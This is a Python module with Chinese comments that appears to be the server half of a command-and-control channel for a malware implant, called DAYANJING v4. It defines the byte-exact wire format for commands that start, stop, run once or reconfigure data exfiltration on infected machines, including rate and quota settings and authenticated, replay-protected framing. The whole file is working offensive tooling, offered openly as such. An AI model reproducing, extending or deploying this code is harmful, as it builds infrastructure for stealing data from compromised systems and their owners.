"""
DAYANJING v4 — C2 下行任务通道（13_c2_server/exfil_task）
=========================================================

让服务端能远程下令"开采 / 停采 / 改参数"，而不是把采集行为写死在植入体里。

本模块是 **C 侧 21_exfil/src/task.c 的 Python 对端**。它不设计新协议，
只是把已定义的线上格式在 Python 侧复刻一遍，因此每个常量与字段偏移都
必须与 C 头文件 include/exfil_task.h 逐字节一致。

任何一处漂移都会表现为 AUTH / CANON / FMT 失败而不是"数据略有不同"，
这是刻意的：宁可整批拒绝，不可静默产出错误语义。

====================================================================
线上格式（与 C 侧完全一致）
====================================================================
命令 payload（56 字节，小端）：
  u8 opcode | u8 flags(0) | u16 rsv(0) | u64 task_id
  u64 min_interval_us | u64 max_interval_us | u32 burst_max
  u64 window_us | u32 window_max_frames | u64 window_max_bytes
  u8 dedup | u8 pad[3](0)

回执 payload（32 字节，小端）：
  u8 opcode | u8 status | u16 rsv(0) | u64 task_id
  u32 mode | u32 frames_sent | u32 window_frames | u64 window_bytes

====================================================================
三条硬规则（与 C 侧对称，差一侧就是漏洞）
====================================================================
1. 编码唯一：所有保留位/填充位必须为 0；非 SET_CFG 命令不得携带配置。
   否则同一语义有多种字节表示，两端实现差异会造成解析分歧。
2. 配置先校验再下发：max < min 会让植入体 poll 恒 WAIT，表现为
   "命令成功但再也不采集"。服务端应在打包前自检，不把故障推给远端。
3. SET_CFG 不得重置配额窗口：C 侧已保证，服务端不应依赖"改配置能刷配额"
   这类行为 —— 速率治理必须无法通过高频改配置绕过。
"""

import struct
from typing import Optional, Dict, Any

# ---------------------------------------------------------------------------
# 常量：与 21_exfil/include/exfil_task.h 逐字节一致
# ---------------------------------------------------------------------------

MSG_TASK = 0x24       # 服务端 -> 植入体
MSG_TASK_ACK = 0x25   # 植入体 -> 服务端

OP_START = 1
OP_ONCE = 2
OP_STOP = 3
OP_SET_CFG = 4
OP_QUERY = 5

OP_NAMES = {
    OP_START: "START",
    OP_ONCE: "ONCE",
    OP_STOP: "STOP",
    OP_SET_CFG: "SET_CFG",
    OP_QUERY: "QUERY",
}

ST_OK = 0
ST_BAD_CFG = 1
ST_UNKNOWN = 2

CMD_LEN = 56
ACK_LEN = 32

# 字段偏移（与 C 的 CMD_OFF_* / ACK_OFF_* 对应）
CMD_OFF_OPCODE = 0
CMD_OFF_FLAGS = 1
CMD_OFF_RSV = 2
CMD_OFF_TASK_ID = 4
CMD_OFF_MIN = 12
CMD_OFF_MAX = 20
CMD_OFF_BURST = 28
CMD_OFF_WINDOW = 32
CMD_OFF_WFRAMES = 40
CMD_OFF_WBYTES = 44
CMD_OFF_DEDUP = 52
CMD_OFF_PAD = 53

ACK_OFF_OPCODE = 0
ACK_OFF_STATUS = 1
ACK_OFF_RSV = 2
ACK_OFF_TASK_ID = 4
ACK_OFF_MODE = 12
ACK_OFF_FRAMES = 16
ACK_OFF_WFRAMES = 20
ACK_OFF_WBYTES = 24

_CMD_FMT = "<BBHQQQIQIQB3x"
_ACK_FMT = "<BBHQIIIQ"

assert struct.calcsize(_CMD_FMT) == CMD_LEN, struct.calcsize(_CMD_FMT)
assert struct.calcsize(_ACK_FMT) == ACK_LEN, struct.calcsize(_ACK_FMT)

# 调度模式（与 exfil_sched.h 一致）
MODE_IDLE = 0
MODE_ONCE = 1
MODE_CONTINUOUS = 2


class TaskError(Exception):
    """任务编解码 / 校验失败。"""


# ---------------------------------------------------------------------------
# 配置
# ---------------------------------------------------------------------------

def default_cfg() -> Dict[str, Any]:
    """与 exfil_sched_default_cfg 一致（保守值）。"""
    return {
        "min_interval_us": 1000000,
        "max_interval_us": 2000000,
        "burst_max": 32,
        "window_us": 10000000,
        "window_max_frames": 8,
        "window_max_bytes": 8 * 1024 * 1024,
        "dedup": 1,
    }


def cfg_is_zero(cfg: Dict[str, Any]) -> bool:
    return all(not cfg[k] for k in (
        "min_interval_us", "max_interval_us", "burst_max",
        "window_us", "window_max_frames", "window_max_bytes", "dedup"))


def cfg_ok(cfg: Dict[str, Any]) -> bool:
    """与 C 侧 exfil_task_cfg_ok 完全一致的校验。"""
    if cfg["max_interval_us"] < cfg["min_interval_us"]:
        return False
    # window_us == 0 表示不设窗口；此时若配额非零，窗口永不滑动，
    # 配额耗尽后调度器永久卡死。必须拒绝。
    if cfg["window_us"] == 0 and (
            cfg["window_max_frames"] != 0 or cfg["window_max_bytes"] != 0):
        return False
    return True


# ---------------------------------------------------------------------------
# 命令编解码
# ---------------------------------------------------------------------------

def encode_cmd(opcode: int, task_id: int,
               cfg: Optional[Dict[str, Any]] = None) -> bytes:
    if opcode not in OP_NAMES:
        raise TaskError(f"unknown opcode {opcode}")

    zero = {k: 0 for k in default_cfg()}
    if opcode != OP_SET_CFG:
        # 编码唯一性：非 SET_CFG 不得携带配置
        if cfg is not None and not cfg_is_zero(cfg):
            raise TaskError("non-SET_CFG command must not carry config")
        use = zero
    else:
        if cfg is None:
            raise TaskError("SET_CFG requires config")
        use = {**zero, **cfg}
        if not cfg_ok(use):
            raise TaskError("invalid schedule config")

    return struct.pack(
        _CMD_FMT,
        opcode, 0, 0,                      # opcode / flags / rsv 均显式写 0
        task_id,
        use["min_interval_us"],
        use["max_interval_us"],
        use["burst_max"],
        use["window_us"],
        use["window_max_frames"],
        use["window_max_bytes"],
        1 if use["dedup"] else 0,
    )


def decode_cmd(payload: bytes) -> Dict[str, Any]:
    if len(payload) != CMD_LEN:
        raise TaskError(f"cmd length {len(payload)} != {CMD_LEN}")

    opcode = payload[CMD_OFF_OPCODE]
    if opcode not in OP_NAMES:
        raise TaskError(f"unknown opcode {opcode}")

    # canonical：保留位必须为 0
    if payload[CMD_OFF_FLAGS] != 0:
        raise TaskError("non-canonical: flags != 0")
    if struct.unpack_from("<H", payload, CMD_OFF_RSV)[0] != 0:
        raise TaskError("non-canonical: rsv != 0")
    if payload[CMD_OFF_PAD:CMD_OFF_PAD + 3] != b"\x00\x00\x00":
        raise TaskError("non-canonical: pad != 0")

    (_, _, _, task_id, mn, mx, burst, win, wf, wb, dedup) = \
        struct.unpack(_CMD_FMT, payload)

    out: Dict[str, Any] = {"opcode": opcode, "task_id": task_id}

    if opcode == OP_SET_CFG:
        cfg = {
            "min_interval_us": mn,
            "max_interval_us": mx,
            "burst_max": burst,
            "window_us": win,
            "window_max_frames": wf,
            "window_max_bytes": wb,
            "dedup": dedup,
        }
        if not cfg_ok(cfg):
            # 与 C 侧 exfil_task_decode_cmd 保持一致：**不在此处拒绝**。
            # 配置合法性是语义层（apply），不是语法层（decode）。
            # 若在 decode 就抛异常，BAD_CFG 回执永远产生不了，服务端
            # 只能靠超时分辨「被拒」与「丢了」，这两者运营含义不同。
            pass
        out["cfg"] = cfg
    else:
        # 非 SET_CFG：配置字段必须为 0
        if (mn or mx or burst or win or wf or wb or dedup):
            raise TaskError("non-canonical: config present on non-SET_CFG")
        out["cfg"] = {k: 0 for k in default_cfg()}

    return out


# ---------------------------------------------------------------------------
# 回执编解码
# ---------------------------------------------------------------------------

def encode_ack(opcode: int, status: int, task_id: int,
               mode: int = 0, frames_sent: int = 0,
               window_frames: int = 0, window_bytes: int = 0) -> bytes:
    if opcode not in OP_NAMES:
        raise TaskError(f"unknown opcode {opcode}")
    return struct.pack(_ACK_FMT, opcode, status, 0, task_id,
                       mode, frames_sent, window_frames, window_bytes)


def decode_ack(payload: bytes) -> Dict[str, Any]:
    if len(payload) != ACK_LEN:
        raise TaskError(f"ack length {len(payload)} != {ACK_LEN}")

    opcode = payload[ACK_OFF_OPCODE]
    if opcode not in OP_NAMES:
        raise TaskError(f"unknown opcode {opcode}")
    if struct.unpack_from("<H", payload, ACK_OFF_RSV)[0] != 0:
        raise TaskError("non-canonical: rsv != 0")

    (_, status, _, task_id, mode, frames, wf, wb) = \
        struct.unpack(_ACK_FMT, payload)

    return {
        "opcode": opcode,
        "status": status,
        "task_id": task_id,
        "mode": mode,
        "frames_sent": frames,
        "window_frames": wf,
        "window_bytes": wb,
    }


# ---------------------------------------------------------------------------
# 通道：把命令封进会话帧
# ---------------------------------------------------------------------------

class TaskChannel:
    """
    在一条已建立的 C2 会话上下发采集任务。

    env 是 frame.SealedEnvelope（服务端视角），命令走它的 k_send，
    因此伪造命令者必须持有会话密钥 —— 这层不额外造凭据。
    """

    def __init__(self, env, start_seq: int = 1):
        self.env = env
        self.seq = start_seq

    def _next_seq(self) -> int:
        s = self.seq
        self.seq += 1
        return s

    def _seal(self, msg_type: int, payload: bytes) -> bytes:
        return self.env.encode(self._next_seq(), msg_type, payload)

    def start(self, task_id: int) -> bytes:
        return self._seal(MSG_TASK, encode_cmd(OP_START, task_id))

    def once(self, task_id: int) -> bytes:
        return self._seal(MSG_TASK, encode_cmd(OP_ONCE, task_id))

    def stop(self, task_id: int) -> bytes:
        return self._seal(MSG_TASK, encode_cmd(OP_STOP, task_id))

    def query(self, task_id: int) -> bytes:
        return self._seal(MSG_TASK, encode_cmd(OP_QUERY, task_id))

    def set_cfg(self, task_id: int, cfg: Dict[str, Any]) -> bytes:
        return self._seal(MSG_TASK, encode_cmd(OP_SET_CFG, task_id, cfg))

    def parse_ack(self, wire: bytes) -> Dict[str, Any]:
        """
        解一回执。验签失败 / 重放 / 类型不符都会抛异常 —— 绝不返回
        "看起来像成功"的部分结果。
        """
        got = self.env.decode(wire)
        if got is None:
            raise TaskError("ack rejected (auth failed or replayed)")
        seq, msg_type, payload = got
        if msg_type != MSG_TASK_ACK:
            raise TaskError(f"unexpected msg_type 0x{msg_type:02x}")
        out = decode_ack(payload)
        out["seq"] = seq
        return out
